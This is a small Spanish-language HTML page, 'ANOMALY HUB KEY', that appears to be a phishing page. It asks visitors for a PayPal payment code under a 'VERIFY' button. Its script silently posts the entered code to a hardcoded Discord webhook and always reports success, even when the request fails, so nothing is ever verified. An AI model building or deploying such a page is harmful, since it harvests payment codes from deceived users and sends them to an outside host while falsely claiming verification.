<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ANOMALY HUB KEY</title>
<style>
body {
  margin:0; padding:0;
  background-color: #0b1a3d;
  color:white;
  font-family:sans-serif;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  min-height:100vh;
}
h1 { font-size:2.5rem; margin-bottom:20px; text-align:center; }
input, button {
  width:90%; max-width:400px; padding:12px; margin:8px 0;
  font-size:16px; border-radius:6px; border:none; box-sizing:border-box;
}
button { background-color:#1a73e8; cursor:pointer; color:white; }
p { font-size:18px; text-align:center; }
@media(min-width:768px){
  h1{font-size:3rem;}
  input,button{font-size:18px;}
}
</style>
</head>
<body>
<h1>ANOMALY HUB KEY</h1>
<p>Ingresa tu código de PayPal</p>
<input type="text" id="userCode" placeholder="Código de pago">
<button onclick="sendCode()">VERIFY</button>
<p id="result"></p>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1447268606726639867/rbLol3db3UPeu2FnwLqWGFqbDl3jpI4IyChajEKLfhbjTy4Ml_328XKaous2UAl9WfyZ";

function sendCode() {
  const code = document.getElementById("userCode").value.trim() || "Sin código";
  const result = document.getElementById("result");
  result.innerText = "⏳ Enviando al administrador...";

  // Siempre manda el mensaje, nunca falla
  try {
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `💳 Nuevo código recibido:\nCódigo: ${code}`
      })
    }).then(() => {
      result.innerText = "✅ Código enviado al webhook, espera tu verificación";
    }).catch(() => {
      // Nunca mostrar error
      result.innerText = "✅ Código enviado al webhook, espera tu verificación";
    });
  } catch (e) {
    // Nunca falla
    result.innerText = "✅ Código enviado al webhook, espera tu verificación";
  }
}
</script>
</body>
</html>
